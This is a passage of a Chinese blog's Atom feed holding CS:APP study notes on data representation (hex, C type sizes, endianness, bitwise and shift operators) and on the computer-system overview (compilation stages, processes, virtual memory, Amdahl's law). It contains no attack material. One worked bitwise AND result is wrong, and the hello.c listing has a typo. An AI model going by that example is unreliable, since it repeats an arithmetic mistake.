    <content type="html"><![CDATA[<ul><li>无符号（unsigned）编码：基于传统二进制表示法，表示大于或等于零的数字</li><li>补码（two’s-complement）编码：表示有符号整数的最常见的方式，有符号整数可以时正或者负的数字</li><li>浮点数（floating-point）编码：表示实数的科学计数法的以2为基数的版本</li></ul><h2 id="信息存储">信息存储</h2><p>大多计算机采用8位的块，或字节(byte)，作为最小的可寻址的内存单位，而不是访问内存中单独的位。</p><p>机器级程序将内存视为一个很大的字节数组，成为<strong>虚拟内存</strong>（virtual memory）。</p><p>内存的每个字节都由一个唯一的数字来表示，成为它的<strong>地址</strong>（address），所有可能地址的集合成为虚拟地址空间（virtual address space）。</p><h3 id="十六进制表示法">十六进制表示法</h3><table><thead><tr><th>十进制</th><th>二进制</th><th>十六进制</th></tr></thead><tbody><tr><td>0</td><td>0000</td><td>0</td></tr><tr><td>1</td><td>0001</td><td>1</td></tr><tr><td>2</td><td>0010</td><td>2</td></tr><tr><td>3</td><td>0011</td><td>3</td></tr><tr><td>4</td><td>0100</td><td>4</td></tr><tr><td>5</td><td>0101</td><td>5</td></tr><tr><td>6</td><td>0110</td><td>6</td></tr><tr><td>7</td><td>0111</td><td>7</td></tr><tr><td>8</td><td>1000</td><td>8</td></tr><tr><td>9</td><td>1001</td><td>9</td></tr><tr><td>10</td><td>1010</td><td>A</td></tr><tr><td>11</td><td>1011</td><td>B</td></tr><tr><td>12</td><td>1100</td><td>C</td></tr><tr><td>13</td><td>1101</td><td>D</td></tr><tr><td>14</td><td>1110</td><td>E</td></tr><tr><td>15</td><td>1111</td><td>F</td></tr></tbody></table><ul><li>二进制转换成十六进制：把二进制数值4个为一组拆分，首部不足4位用0补齐，然后对照上表转换。如二进制数<code>1111001010110110110011</code>可以拆分为<code>0011 1100 1010 1101 1011 0011</code>，然后对照上表转为十六进制就是<code>3CADB3</code></li><li>十六进制转换成二进制：直接根据上表转换即可。</li></ul><h3 id="字数据大小">字数据大小</h3><p>每台计算机都有一个<strong>字长</strong>（word size），指明指针数据的<strong>标称大小</strong>（nominal size）。</p><p>因为虚拟地址是以字来编码的，所以字长决定的最重要的系统参数就是虚拟地址空间的最大大小。即：对字长为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ω</mi></mrow><annotation encoding="application/x-tex">\omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ω</span></span></span></span>位的机器来说，虚拟地址的范围为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><msup><mn>2</mn><mi>ω</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\thicksim2^\omega-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ω</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，程序最多访问<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>ω</mi></msup></mrow><annotation encoding="application/x-tex">2^\omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ω</span></span></span></span></span></span></span></span></span></span></span>个字节。</p><table>    <tr>        <td colspan="2">C声明</td>         <td colspan="2">字节数</td>    </tr>    <tr>        <td>有符号</td>        <td>无符号</td>        <td>32位</td>        <td>64位</td>    </tr>    <tr>        <td>[signed] char</td>        <td>unsigned char</td>        <td>1</td>        <td>1</td>     </tr>    <tr>        <td>short</td>        <td>unsigned short</td>        <td>2</td>        <td>2</td>     </tr>    <tr>        <td>int</td>        <td>unsigned int</td>        <td>4</td>        <td>4</td>     </tr>    <tr>        <td>long</td>        <td>unsigned long</td>        <td>4</td>        <td>8</td>     </tr>    <tr>        <td>int32_t</td>        <td>uint32_t</td>        <td>4</td>        <td>4</td>     </tr>    <tr>        <td>int64_t</td>        <td>uint64_t</td>        <td>8</td>        <td>8</td>      </tr>    <tr>        <td>char *</td>        <td></td>        <td>4</td>        <td>8</td>     </tr>    <tr>        <td>float</td>        <td></td>        <td>4</td>        <td>4</td>     </tr>    <tr>        <td>double</td>        <td></td>        <td>8</td>        <td>8</td>     </tr></table><h3 id="寻址和字节顺序">寻址和字节顺序</h3><p>对于跨越多字节的程序对象，必须建立两个规则：</p><ol><li>这个对象的地址是什么</li><li>在内存中如何排列这些字节</li></ol><h4 id="对象的地址">对象的地址</h4><p>在几乎所有机器上，多字节对象都被存储为连续的字节序列，对象的地址为<strong>所使用字节中最小的地址</strong>。</p><p>例如int类型变量x，它的地址为<code>0x100</code>，地址表达式<code>&amp;x</code>的值就为<code>0x100</code>。那么，x的4个字节将会被存储在内存的<code>0x100 ~ 0x103</code>位置。</p><h4 id="内存排列">内存排列</h4><p>某些机器选择在内存中按照最低有效字节到最高有效字节顺序存储对象，即<strong>小端法</strong>（little endian）；某些机器选择在内存中按照最高有效字节到最低有效字节的顺序存储对象，即<strong>大端法</strong>（big endian）。</p><p>假设变量x是一个int类型的变量，位于地址<code>0x100</code>处，它的十六进制值为<code>0x01234567</code>。那么它以大端法和小端法的存储结果如下图1所示。</p><p><img src="/img/csapp/2/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%9C.png" alt="图1 存储结果"></p><h3 id="表示字符串">表示字符串</h3><p>C语言中字符串被编码为一个以<strong>null字符结尾</strong>的字符数组，最常见的就是ASCII字符码。字符串存储的字节顺序和子大小规则无关。</p><h3 id="表示代码">表示代码</h3><p>不同机器类型使用不同的且不兼容的指令和编码方式。即使是完全一样的进程，运行在不同操作系统上也会有不同的编码规则，因此<strong>二进制代码是不兼容的</strong>。</p><p>计算机系统的基本概念：从机器角度来看，程序仅仅只是字节序列。</p><h3 id="布尔代数简介">布尔代数简介</h3><table>    <tr>        <td>数字1</td>        <td>数字2</td>        <td>运算符号</td>        <td>运算结果</td>    </tr>    <tr>        <td>0</td>        <td></td>        <td rowspan="2">~</td>        <td>1</td>    </tr>    <tr>        <td>1</td>        <td></td>        <td>0</td>    </tr>    <tr>        <td rowspan="3">0</td>        <td rowspan="3">0</td>        <td>&</td>        <td>0</td>    </tr>    <tr>        <td>|</td>        <td>0</td>    </tr>    <tr>        <td>^</td>        <td>0</td>    </tr>    <tr>        <td rowspan="3">0</td>        <td rowspan="3">1</td>        <td>&</td>        <td>0</td>    </tr>    <tr>        <td>|</td>        <td>1</td>    </tr>    <tr>        <td>^</td>        <td>1</td>    </tr>    <tr>        <td rowspan="3">1</td>        <td rowspan="3">0</td>        <td>&</td>        <td>0</td>    </tr>    <tr>        <td>|</td>        <td>1</td>    </tr>    <tr>        <td>^</td>        <td>1</td>    </tr>    <tr>        <td rowspan="3">1</td>        <td rowspan="3">1</td>        <td>&</td>        <td>1</td>    </tr>    <tr>        <td>|</td>        <td>1</td>    </tr>    <tr>        <td>^</td>        <td>0</td>    </tr></table><h4 id="位向量运算">位向量运算</h4><p>用位向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>a</mi><mrow><mi>ω</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a_{\omega-1}, …, a_1, a_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ω</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>编码任何子集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⊆</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>ω</mi><mo>−</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">A\sube\{0, 1, …, \omega-1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ω</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">a_i=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，当且仅当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>∈</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">i\in A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69862em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>。</p><p>例如位向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>≐</mo><mo stretchy="false">[</mo><mn>01101001</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a\doteq [01101001]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.67em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≐</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">01101001</span><span class="mclose">]</span></span></span></span>表示集合<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">A=\{0, 3, 5, 6\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mclose">}</span></span></span></span>，而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>≐</mo><mo stretchy="false">[</mo><mn>01010101</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">b\doteq [01010101]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≐</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">01010101</span><span class="mclose">]</span></span></span></span>表示集合<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">B=\{0, 2, 4, 6\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mclose">}</span></span></span></span>。当进行运算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">&amp;</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">a\&amp;b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord">&amp;</span><span class="mord mathnormal">b</span></span></span></span>后得到的结果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>01000010</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[01000010]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">01000010</span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>∩</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A\cap B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>的结果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mclose">]</span></span></span></span>相同。</p><h3 id="C语言中的位级运算">C语言中的位级运算</h3><p>上述布尔代数所使用的运算符号（^、&amp;、|、~）均可使用在C语言中。</p><p>位级运算的一个常见用法就是实现掩码运算，这里掩码是一个位模式，表示从一个字中选出的位的集合。</p><p>例如掩码<code>0xFF</code>表示一个字的最低位字节，位级运算<code>x&amp;0xFF</code>生成一个由x的最低有效字节组成的值，其他字节被置为0。如<code>x = 0x89ABCDEF</code>，那么运算结果则为<code>0xEF</code>。</p><h3 id="C语言中的逻辑运算">C语言中的逻辑运算</h3><p>C语言中还有一些逻辑运算符：||、&amp;&amp;、!。它们分别表示：OR、AND、NOT运算。</p><p>在逻辑运算中，所有非零的参数都表示为TRUE，而参数0表示为FALSE。他们返回1或0，分别表示的是TRUE和FALSE。</p><h3 id="C语言中的移位运算">C语言中的移位运算</h3><ul><li>左移：&lt;&lt;，直接把数字左移，右侧补0</li><li>逻辑右移：&gt;&gt;，直接把数字右移，左侧补0</li><li>算术右移：&gt;&gt;，把数字右移，左侧补最高位</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;无符号（unsigned）编码：基于传统二进制表示法，表示大于或等于零的数字&lt;/li&gt;
&lt;li&gt;补码（two’s-complement）编码：表示有符号整数的最常见的方式，有符号整数可以时正或者负的数字&lt;/li&gt;
&lt;li&gt;浮点数（floating-point）编</summary>
      
    
    
    
    <category term="csapp" scheme="https://ruom0.github.io/categories/csapp/"/>
    
    
    <category term="csapp" scheme="https://ruom0.github.io/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>第1章 计算机系统漫游</title>
    <link href="https://ruom0.github.io/2021/05/28/csapp/%E7%AC%AC1%E7%AB%A0_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8/"/>
    <id>https://ruom0.github.io/2021/05/28/csapp/%E7%AC%AC1%E7%AB%A0_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8/</id>
    <published>2021-05-28T09:14:20.927Z</published>
    <updated>2021-06-01T13:28:00.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序编译过程">程序编译过程</h2><p>假设已有<code>hello.c</code>，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span> O; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>预处理阶段：预处理器（cpp）根据以字符<code>#</code>开头的命令，将<code>hello.c</code>文件中的头文件<code>stdio.h</code>的内容插入到程序文本中，得到新的源程序<code>hello.i</code>；</li><li>编译阶段：编译器（ccl）将<code>hello.i</code>文件翻译为<strong>文本文件</strong><code>hello.s</code>，其包含一个汇编语言程序；</li><li>汇编阶段：汇编器（as）将<code>hello.s</code>文件翻译成机器语言指令，并且把这些指令打包成<strong>可重定位目标程序</strong>的格式，最后将结果保存在<code>hello.o</code>文件中，其是一个二进制文件；</li><li>链接阶段：链接器（ld）会将我们之前生成的<code>hello.o</code>文件和其他<code>.o</code>文件进行合并，得到一个<strong>可执行目标文件</strong>。例如上述的程序存在标准C库中的<code>printf</code>函数，链接器在链接阶段会将<code>hello.o</code>和<code>printf.o</code>进行合并。</li></ul><h2 id="系统硬件的组成">系统硬件的组成</h2><ul><li>总线</li><li>I/O设备（输入/输出设备）</li><li>主存，由一组动态随机存取存储器（DRAM）芯片组成</li><li>处理器（CPU），用于解释或执行存储在主存中的指令，主要有以下几个操作：<ul><li>加载：从主存复制一个字节或者一个字到寄存器，覆盖寄存器原来的内容；</li><li>存储：从寄存器中复制出一个字节或者一个字到主存的某个位置，覆盖主存该位置的原来内容；</li><li>操作：将两个寄存器的内容复制到ALU（算数/逻辑单元），ALU对这两个字做算术运算，并把结果放到一个寄存器中，覆盖寄存器原有内容；</li><li>跳转：从指令本身中抽取一个字，复制到程序计数器（PC）中，覆盖PC原有的值。</li></ul></li></ul><h2 id="各种抽象表示">各种抽象表示</h2><h3 id="进程">进程</h3><p>进程是操作系统对一个正在运行的程序的一种抽象，同一个系统可以同时运行多个进程，每个进程都看似在独立地占用硬件。但是在任何一个时刻，处理器都只能够执行一个进程的代码。</p><p><strong>并发运行</strong>指的是一个进程地指令和另一个进程的指令是交错执行的。无论在单核还是多核系统中，一个CPU看上去就像是在并发执行多个进程，这种现象是通过处理器在进程之间切换实现的。在操作系统中将这种交错执行的机制成为<strong>上下文切换</strong>。</p><p><strong>上下文</strong>，即操作系统保持跟踪进程所需要的状态信息，包括PC和寄存器文件的当前值、主存内容等。由于在任意时刻单个处理器都只能执行一个进程的代码，因此当操作系统决定要把控制权转移到另一个进程时就会进行<strong>上下文切换</strong>，即保存当前进程的上下文、恢复新进程的上下文，然后将控制权转移给新进程。</p><h3 id="虚拟内存">虚拟内存</h3><p>虚拟内存为每个进程都提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致地，成为<strong>虚拟地址空间</strong>。在Linux进程中的虚拟地址空间如下图1所示。注意，图中的地址是从下往上增大的。</p><p><img src="/img/csapp/1/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="图1 进程地虚拟地址空间"></p><p>在Linux中，地址空间的最上部分是保留给操作系统中的代码和数据的，对所有进程来说都一样。每个进程看到的虚拟地址空间都由大量的准确定义的区构成，每个区都有其专门的功能。</p><ul><li>程序代码和数据。对所有进程来说，代码都是从同一固定地址开始的，紧接着是和C的<strong>全局变量</strong>相对应的数据位置。代码和数据区可直接按照可执行目标文件的内容初始化；</li><li>堆。代码和数据区后就是运行时的堆。代码和数据区在进程的一开始就已经被指定了大小，而当在调用如malloc、free这样的函数时，堆可以在运行时动态地扩展和收缩；</li><li>共享库。大约在地址空间的中间部分是一块用来存放像C标准库和数学库之类的共享库的代码和数据的区域；</li><li>栈。位于用户虚拟地址空间顶部的就是用户栈，编译器用它来实现函数的调用。和堆一样，用户栈可以动态地扩展和收缩。但和堆不同的时，栈是在调用一个函数时增长，从一个函数返回时收缩；</li><li>内核虚拟内存。地址空间顶部的区域保留给内核，不允许应用程序写这个区域的内容或者直接调用这个区域的函数。</li></ul><h3 id="文件">文件</h3><p>文件就是<strong>字节序</strong>。每个I/O设备，包括磁盘、键盘、显示器，甚至网络都可以看成是文件。系统中的所有输入和输出都是通过使用一小组成为Unix I/O的系统函数调用读写文件实现的。</p><h2 id="系统之间利用网络通信">系统之间利用网络通信</h2><p>现代系统经常通过网络和其他系统连接在一起。</p><p>从单一系统来看，网络可以视为一个I/O设备，即网络适配器。当系统从主存复制一串字节到网络适配器时，数据流经过网络适配器传输到另一台机器。相似地，系统也可以通过网络适配器读取从其他机器发送过来的数据，并把数据复制到自己的主存。</p><h2 id="重要主题">重要主题</h2><h3 id="Amdahl定律">Amdahl定律</h3><p>主要思想：当我们对系统的某个部分进行加速时，其对系统整体的性能的影响取决于该部分的重要性以及加速的程度。</p><p>若系统执行某应用程序需要花费的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">T_{old}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。假设系统某部分所需执行时间与该时间的比例为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span>，该部分性能提升比例为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>。即该部分初始所需花费的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\alpha T_{old}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span 